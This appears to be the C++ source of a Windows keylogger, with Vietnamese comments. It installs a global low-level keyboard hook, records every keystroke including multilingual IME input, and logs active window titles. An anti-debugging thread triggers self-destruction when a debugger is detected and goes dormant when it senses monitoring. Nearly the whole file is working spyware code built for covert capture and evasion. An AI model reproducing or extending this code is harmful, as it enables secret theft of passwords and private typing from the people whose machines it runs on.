﻿#include "keylogger.h"
#include "utils.h"
#include "antidebug.h"
#include "multilanguage.h"

// Biến toàn cục
bool capital = false, numLock = false, shift = false;
DWORD tid = 0;
HHOOK g_msgHook = NULL;  // Hook cho các thông báo

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        KBDLLHOOKSTRUCT* kbStruct = (KBDLLHOOKSTRUCT*)lParam;

        // Phát hiện Alt+Shift (chuyển ngôn ngữ)
        if ((kbStruct->vkCode == VK_SHIFT && (GetAsyncKeyState(VK_MENU) & 0x8000)) ||
            (kbStruct->vkCode == VK_MENU && (GetAsyncKeyState(VK_SHIFT) & 0x8000))) {
            // Cập nhật thông tin ngôn ngữ sau một khoảng thời gian ngắn
            std::thread([] {
                Sleep(100); // Đợi hệ thống cập nhật
                UpdateImeStatus();
                }).detach();
        }
    }

    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

LRESULT CALLBACK HookProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        static HWND lastWindow = NULL;
        HWND currentWindow = GetForegroundWindow();

        // Cập nhật thông tin ngôn ngữ mỗi khi cửa sổ thay đổi
        static HKL lastKeyboardLayout = 0;
        HKL currentKeyboard = GetKeyboardLayout(GetWindowThreadProcessId(currentWindow, NULL));

        if (currentKeyboard != lastKeyboardLayout) {
            UpdateImeStatus();
            lastKeyboardLayout = currentKeyboard;
        }

        // Ghi lại tiêu đề cửa sổ khi người dùng chuyển cửa sổ
        if (currentWindow != lastWindow) {
            lastWindow = currentWindow;
            LogWindowTitle();
        }

        PKBDLLHOOKSTRUCT keystroke = (PKBDLLHOOKSTRUCT)lParam;

        // Cập nhật trạng thái phím
        if (keystroke->vkCode == VK_LSHIFT || keystroke->vkCode == VK_RSHIFT) {
            shift = wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN;
        }
        else if (wParam == WM_SYSKEYDOWN || wParam == WM_KEYDOWN) {
            // Xử lý đa ngôn ngữ
            LanguageInfo langInfo = GetCurrentLanguageInfo();

            // Nếu đang sử dụng IME, để ImeHookProc xử lý
         if (langInfo.isImeActive && IsImeLanguage(langInfo.keyboardLayout)) {
                // Chỉ xử lý các phím đặc biệt, còn các ký tự sẽ do ImeHookProc xử lý
                switch (keystroke->vkCode) {
                case VK_RETURN: { Write("\n"); break; }
                case VK_SPACE: { Write(" "); break; } 
                case VK_TAB: { Write("    "); break; }
                case VK_MENU: { Write("[ALT]"); break; }
                case VK_PRINT: { Write("[PRINT]"); break; }
                case VK_SNAPSHOT: { Write("[PRT SC]"); break; }
                case VK_BACK: case VK_DELETE: case VK_LEFT: case VK_RIGHT:
                case VK_UP: case VK_DOWN: case VK_ESCAPE: case VK_PRIOR:
                case VK_NEXT: case VK_HOME: case VK_END: case VK_INSERT:
                case VK_LWIN: case VK_RWIN: case VK_LCONTROL: case VK_RCONTROL:
                case VK_LMENU: case VK_RMENU: case VK_LSHIFT: case VK_RSHIFT:
                    break;

                }

                // Ghi lại các phím nhập liệu trực tiếp nếu không phải đang soạn thảo
                if (!langInfo.isComposing) {
                    BYTE keyState[256] = { 0 };
                    if (GetKeyboardState(keyState)) {
                        std::wstring unicodeChar = ExtractUnicodeCharFromKey(keystroke->vkCode, keyState);
                        if (!unicodeChar.empty()) {
                            WriteUnicode(unicodeChar);
                        }
                    }
                    else {
                        GetKeyboardState(keyState);
                    }

                    std::wstring unicodeChar = ExtractUnicodeCharFromKey(keystroke->vkCode, keyState);
                    if (!unicodeChar.empty()) {
                        WriteUnicode(unicodeChar);
                    }
                }
            }
            else {
                // Xử lý bình thường cho ngôn ngữ không dùng IME
                switch (keystroke->vkCode) {
                case 0x41: { Write(capital ? (shift ? "a" : "A") : (shift ? "A" : "a")); break; }
                case 0x42: { Write(capital ? (shift ? "b" : "B") : (shift ? "B" : "b")); break; }
                case 0x43: { Write(capital ? (shift ? "c" : "C") : (shift ? "C" : "c")); break; }
                case 0x44: { Write(capital ? (shift ? "d" : "D") : (shift ? "D" : "d")); break; }
                case 0x45: { Write(capital ? (shift ? "e" : "E") : (shift ? "E" : "e")); break; }
                case 0x46: { Write(capital ? (shift ? "f" : "F") : (shift ? "F" : "f")); break; }
                case 0x47: { Write(capital ? (shift ? "g" : "G") : (shift ? "G" : "g")); break; }
                case 0x48: { Write(capital ? (shift ? "h" : "H") : (shift ? "H" : "h")); break; }
                case 0x49: { Write(capital ? (shift ? "i" : "I") : (shift ? "I" : "i")); break; }
                case 0x4A: { Write(capital ? (shift ? "j" : "J") : (shift ? "J" : "j")); break; }
                case 0x4B: { Write(capital ? (shift ? "k" : "K") : (shift ? "K" : "k")); break; }
                case 0x4C: { Write(capital ? (shift ? "l" : "L") : (shift ? "L" : "l")); break; }
                case 0x4D: { Write(capital ? (shift ? "m" : "M") : (shift ? "M" : "m")); break; }
                case 0x4E: { Write(capital ? (shift ? "n" : "N") : (shift ? "N" : "n")); break; }
                case 0x4F: { Write(capital ? (shift ? "o" : "O") : (shift ? "O" : "o")); break; }
                case 0x50: { Write(capital ? (shift ? "p" : "P") : (shift ? "P" : "p")); break; }
                case 0x51: { Write(capital ? (shift ? "q" : "Q") : (shift ? "Q" : "q")); break; }
                case 0x52: { Write(capital ? (shift ? "r" : "R") : (shift ? "R" : "r")); break; }
                case 0x53: { Write(capital ? (shift ? "s" : "S") : (shift ? "S" : "s")); break; }
                case 0x54: { Write(capital ? (shift ? "t" : "T") : (shift ? "T" : "t")); break; }
                case 0x55: { Write(capital ? (shift ? "u" : "U") : (shift ? "U" : "u")); break; }
                case 0x56: { Write(capital ? (shift ? "v" : "V") : (shift ? "V" : "v")); break; }
                case 0x57: { Write(capital ? (shift ? "w" : "W") : (shift ? "W" : "w")); break; }
                case 0x58: { Write(capital ? (shift ? "x" : "X") : (shift ? "X" : "x")); break; }
                case 0x59: { Write(capital ? (shift ? "y" : "Y") : (shift ? "Y" : "y")); break; }
                case 0x5A: { Write(capital ? (shift ? "z" : "Z") : (shift ? "Z" : "z")); break; }
                case 0x30: { Write(shift ? ")" : "0"); break; }
                case 0x31: { Write(shift ? "!" : "1"); break; }
                case 0x32: { Write(shift ? "@" : "2"); break; }
                case 0x33: { Write(shift ? "#" : "3"); break; }
                case 0x34: { Write(shift ? "$" : "4"); break; }
                case 0x35: { Write(shift ? "%" : "5"); break; }
                case 0x36: { Write(shift ? "^" : "6"); break; }
                case 0x37: { Write(shift ? "&" : "7"); break; }
                case 0x38: { Write(shift ? "*" : "8"); break; }
                case 0x39: { Write(shift ? "(" : "9"); break; }
                case VK_OEM_1: { Write(shift ? ":" : ";"); break; }
                case VK_OEM_2: { Write(shift ? "?" : "/"); break; }
                case VK_OEM_3: { Write(shift ? "~" : "`"); break; }
                case VK_OEM_4: { Write(shift ? "{" : "["); break; }
                case VK_OEM_5: { Write(shift ? "|" : "\\"); break; }
                case VK_OEM_6: { Write(shift ? "}" : "]"); break; }
                case VK_OEM_7: { Write(shift ? "\"" : "'"); break; }
                case VK_OEM_PLUS: { Write(shift ? "+" : "="); break; }
                case VK_OEM_COMMA: { Write(shift ? "<" : ","); break; }
                case VK_OEM_MINUS: { Write(shift ? "_" : "-"); break; }
                case VK_OEM_PERIOD: { Write(shift ? ">" : "."); break; }
                case VK_SPACE: { Write(" "); break; }
                case VK_NUMPAD0: { Write("0"); break; }
                case VK_NUMPAD1: { Write("1"); break; }
                case VK_NUMPAD2: { Write("2"); break; }
                case VK_NUMPAD3: { Write("3"); break; }
                case VK_NUMPAD4: { Write("4"); break; }
                case VK_NUMPAD5: { Write("5"); break; }
                case VK_NUMPAD6: { Write("6"); break; }
                case VK_NUMPAD7: { Write("7"); break; }
                case VK_NUMPAD8: { Write("8"); break; }
                case VK_NUMPAD9: { Write("9"); break; }
                case VK_MULTIPLY: { Write("*"); break; }
                case VK_ADD: { Write("+"); break; }
                case VK_SUBTRACT: { Write("-"); break; }
                case VK_DECIMAL: { Write("."); break; }
                case VK_DIVIDE: { Write("/"); break; }
                case VK_BACK: { Write("[BACKSPACE]"); break; }
                case VK_TAB: { Write("[TAB]"); break; }
                case VK_RETURN: { Write("[ENTER]"); break; }
                case VK_MENU: { Write("[ALT]"); break; }
                case VK_ESCAPE: { Write("[ESC]"); break; }
                case VK_PRIOR: { Write("[PG UP]"); break; }
                case VK_NEXT: { Write("[PG DN]"); break; }
                case VK_END: { Write("[END]"); break; }
                case VK_HOME: { Write("[HOME]"); break; }
                case VK_LEFT: { Write("[LEFT]"); break; }
                case VK_UP: { Write("[UP]"); break; }
                case VK_RIGHT: { Write("[RIGHT]"); break; }
                case VK_DOWN: { Write("[DOWN]"); break; }
                case VK_PRINT: { Write("[PRINT]"); break; }
                case VK_SNAPSHOT: { Write("[PRT SC]"); break; }
                case VK_INSERT: { Write("[INSERT]"); break; }
                case VK_DELETE: { Write("[DELETE]"); break; }
                case VK_LWIN: { Write("[WIN KEY]"); break; }
                case VK_RWIN: { Write("[WIN KEY]"); break; }
                case VK_CAPITAL: { capital = !capital;   break; }
                case VK_NUMLOCK: { numLock = !numLock;   break; }
                case VK_LCONTROL: { if (wParam == WM_KEYDOWN) { Write("[CTRL]"); } break; }
                case VK_RCONTROL: { if (wParam == WM_KEYDOWN) { Write("[CTRL]"); } break; }
                case VK_F1: { Write("[F1]"); break; }
                case VK_F2: { Write("[F2]"); break; }
                case VK_F3: { Write("[F3]"); break; }
                case VK_F4: { Write("[F4]"); break; }
                case VK_F5: { Write("[F5]"); break; }
                case VK_F6: { Write("[F6]"); break; }
                case VK_F7: { Write("[F7]"); break; }
                case VK_F8: { Write("[F8]"); break; }
                case VK_F9: { Write("[F9]"); break; }
                case VK_F10: { Write("[F10]"); break; }
                case VK_F11: { Write("[F11]"); break; }
                case VK_F12: { Write("[F12]"); break; }
                default: {
                    DWORD dWord = keystroke->scanCode << 16;
                    dWord += keystroke->flags << 24;
                    char otherKey[16] = "";
                    if (GetKeyNameTextA(dWord, otherKey, sizeof(otherKey)) != 0) {
                        Write(otherKey);
                    }
                }
                }
            }
        }
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

void HookJob() {
    // Khởi tạo các hook

    // 1. Hook bàn phím tiêu chuẩn
    HHOOK hHook = SetWindowsHookExA(WH_KEYBOARD_LL, HookProc, NULL, 0);

    // 2. Hook các thông báo Windows để bắt thông báo IME
    g_msgHook = SetWindowsHookExA(WH_CALLWNDPROC, ImeHookProc, NULL, GetCurrentThreadId());

    if (hHook == NULL) {
        // Xử lý thất bại
    }
    else {
        // Khởi tạo thông tin ngôn ngữ
        UpdateImeStatus();

        // Khởi tạo trạng thái phím
        capital = GetKeyState(VK_CAPITAL) & 0x0001;
        numLock = GetKeyState(VK_NUMLOCK) & 0x0001;

        // Vòng lặp xử lý thông điệp
        MSG msg = { };
        while (GetMessageA(&msg, NULL, 0, 0) > 0) {
            TranslateMessage(&msg);
            DispatchMessageA(&msg);
        }

        // Giải phóng các hook khi kết thúc
        if (UnhookWindowsHookEx(hHook) == 0) {
            // Xử lý thất bại
        }

        if (g_msgHook && UnhookWindowsHookEx(g_msgHook) == 0) {
            // Xử lý thất bại
        }

        CloseHandle(hHook);
    }
}

void RemoveHookThread(int code) {
    if (PostThreadMessageA(tid, WM_QUIT, NULL, NULL) == 0) {
        // Xử lý thất bại
        exit(EXIT_FAILURE);
    }
}

void CreateHookThread() {
    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)HookJob, NULL, 0, &tid);
    if (hThread == NULL) {
        // Xử lý thất bại
    }
    else {
        signal(SIGINT, RemoveHookThread);
        WaitForSingleObject(hThread, INFINITE);
        signal(SIGINT, SIG_DFL);
        CloseHandle(hThread);
    }
}

void SecurityCheckJob() {
    while (true) {
        // Kiểm tra mỗi 5 giây
        std::this_thread::sleep_for(std::chrono::seconds(5));

        // Kiểm tra có đang bị debug không
        if (IsBeingDebugged()) {
            SelfDestruct();
        }

        // Kiểm tra có đang bị giám sát không
        if (IsBeingMonitored()) {
            // Tạm dừng hoạt động thay vì tự hủy
            std::this_thread::sleep_for(std::chrono::minutes(5));
        }
    }
}